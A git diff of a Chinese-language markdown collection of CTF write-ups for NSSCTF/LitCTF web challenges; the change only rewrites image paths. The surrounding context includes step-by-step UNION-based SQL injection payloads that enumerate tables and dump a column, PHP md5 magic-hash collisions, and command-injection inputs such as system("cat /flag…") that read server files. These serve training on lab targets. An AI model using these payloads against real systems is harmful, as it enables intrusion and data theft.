@@ -84,9 +84,9 @@ SEE{you_found_me_now_try_the_1337er_one}
 
 ### 思路
 - 打开网站发现没有可交互的点，于是`F12`控制台审查元素
-- 打开控制台后看到： ![](04nss/img-007.png)
+- 打开控制台后看到： ![](../img-007.png)
 	> **控制台（Console）** 会输出页面资源报错信息/`js`的执行信息，同时也可以在这个交互式终端中执行`js`指令
-- 彩蛋提示运行`giveMeEgg()`函数即可拿到彩蛋，所以：  ![](04nss/img-002.png)
+- 彩蛋提示运行`giveMeEgg()`函数即可拿到彩蛋，所以：  ![](../img-002.png)
 - 但提交后发现不对😭,`CTRL+U`查看源码，`CTRL+F`进行搜索`flag`，在最下面的注释找到`flag`
 
 ---
@@ -94,22 +94,22 @@ SEE{you_found_me_now_try_the_1337er_one}
 ## [[LitCTF 2023]导弹迷踪 - NSSCTF](https://www.nssctf.cn/problem/3863)
 ### 思路
 - 这是一个小游戏，而针对这种逻辑是基于`js`的页面游戏，要么采用按照题目要求玩到第六关得到`flag`，要么就修改或者查看源码寻找`flag`
-- `F12`查看源码，在搜索框搜索`"level"`，找到`flag`  ![](04nss/img-003.png)
+- `F12`查看源码，在搜索框搜索`"level"`，找到`flag`  ![](../img-003.png)
 
 ---
 
 ## [[LitCTF 2023]就当无事发生 - NSSCTF](https://www.nssctf.cn/problem/3862)
 ### 思路
 - 题目提示：“差点数据没脱敏就发出去了”，同时结合博客网址于是去`Github`上搜索`ProbiusOfficial`
-- 出现两条结果，查看后博客的源码应该在第二个  ![](04nss/img-008.png)
-- 进入仓库后找到`Commits`（提交记录），因为在题目的版本数据中找到题目的上传时间为`2023-05-02`，于是将仓库的查询时间改为`5`月`2`日之前。  ![](04nss/img-004.png)![](04nss/img-005.png)
-- 从查询结果我们发现，`4`月`29`日有两个提交记录，点进后一个提交记录可以看见修改  ![](04nss/img-009.png)
+- 出现两条结果，查看后博客的源码应该在第二个  ![](../img-008.png)
+- 进入仓库后找到`Commits`（提交记录），因为在题目的版本数据中找到题目的上传时间为`2023-05-02`，于是将仓库的查询时间改为`5`月`2`日之前。  ![](../img-004.png)![](../img-005.png)
+- 从查询结果我们发现，`4`月`29`日有两个提交记录，点进后一个提交记录可以看见修改  ![](../img-009.png)
 
 ---
 
 ## [[LitCTF 2023]Follow me and hack me - NSSCTF](https://www.nssctf.cn/problem/3864)
 ### 思路
-- 使用`HackBar`插件来在浏览器里面进行发送/接收`http`报文  ![](04nss/img-006.png)
+- 使用`HackBar`插件来在浏览器里面进行发送/接收`http`报文  ![](../img-006.png)
 
 ---
 
@@ -147,7 +147,7 @@ SEE{you_found_me_now_try_the_1337er_one}
 QNKCDZO -> 0e830400451993494058024219903391
 240610708 -> 0e462097431906509019562988736854
 ```
-![](04nss/img-001.png)
+![](../img-001.png)
 得到`flag`
 ```txt
 NSSCTF{6ee63399-6c66-42f3-9216-2980f9982e38}
@@ -220,7 +220,7 @@ include_once($file);
 ```txt
 ?/wllm=1
 ```
-![](04nss/img-010.png)
+![](../img-010.png)
 
 2‍⃣ **判断字段数：`order by`**
 ```txt
@@ -230,7 +230,7 @@ include_once($file);
 /?wllm=1' order by 4 --+
 ```
 当`order by 4`时，产生报错，说明字段数是`3`
-![](04nss/img-011.png)
+![](../img-011.png)
 
 3‍⃣ **查看回显点：`union select 1,2,3`**
 >回显点：
@@ -238,7 +238,7 @@ include_once($file);
 ```txt
 /?wllm=-1' union select 1,2,3 -- '
 ```
-![](04nss/img-012.png)
+![](../img-012.png)
 所以要想查询数据库名就可以把`database()`放到第二位或者第三位
 ```txt
 ?/wllm=-1' union select 1,database(),3 --+
@@ -254,7 +254,7 @@ include_once($file);
 /?wllm=-1' union select 1,2,@@version -- '
 /?wllm=-1' union select 1,@@version,3 -- '
 ```
-![](04nss/img-013.png)![](../img-014.png)
+![](../img-013.png)![](../img-014.png)
 >`@@version`：是`MySQL / MariaDB`里的系统变量，用来显示数据库版本
 >这一步的作用：确认数据库类型和版本
 如果是`MySQL/MariaDB`，就可以使用
@@ -278,7 +278,7 @@ group_concat()
 ```txt
 /?wllm=-1' union select 1,2,database() -- '
 ```
-![](04nss/img-015.png)
+![](../img-015.png)
 得到当前数据库名为：`test_db`——说明当前网站的数据在`text_db`中。又使用：
 ```txt
 /?wllm=-1' union select 1,2,user() -- '
@@ -289,7 +289,7 @@ group_concat()
 ```txt
 /?wllm=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='test_db'-- '
 ```
-![](04nss/img-016.png)
+![](../img-016.png)
 查出有两个表且将二者合并到一行显示：`test_tb,users`
 
 >`group_concat(table_name)`：把多个表名合并到一行显示
@@ -301,13 +301,13 @@ group_concat()
 ```txt
 /?wllm=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='test_tb' -- '
 ```
-![](04nss/img-017.png)说明`flag`很可能就在`test_tb`表里
+![](../img-017.png)说明`flag`很可能就在`test_tb`表里
 
 8‍⃣**查`flag`**
 ```txt
 /?wllm=-1' union select 1,2,group_concat(flag) from test_tb -- '
 ```
-![](04nss/img-018.png)
+![](../img-018.png)
 
 9‍⃣**总结**
 ```txt
@@ -339,14 +339,14 @@ group_concat()
 ?url=system("ls /");
 ```
 查看服务器根目录下有什么文件
-![](04nss/img-019.png)
+![](../img-019.png)
 其中，`flllllaaaaaaggggggg`很可疑
 
 4‍⃣ **读取`flag`文件**
 ```PHP
 ?url=system("cat /flllllaaaaaaggggggg");
 ```
-![](04nss/img-020.png)
+![](../img-020.png)
 
 ---
 
@@ -357,11 +357,11 @@ group_concat()
 ```bash
 dirsearch -u
 ```
-![](04nss/img-021.png)
+![](../img-021.png)
 扫描后看见`robots.txt`
 进入`robots.txt`后得知存在`/cl45s.php`，于是进入该目录下打开该文件获得代码
-![](04nss/img-022.png)
-![](04nss/img-023.png)
+![](../img-022.png)
+![](../img-023.png)
 2‍⃣**代码分析**
 首先看开头：
 ```php
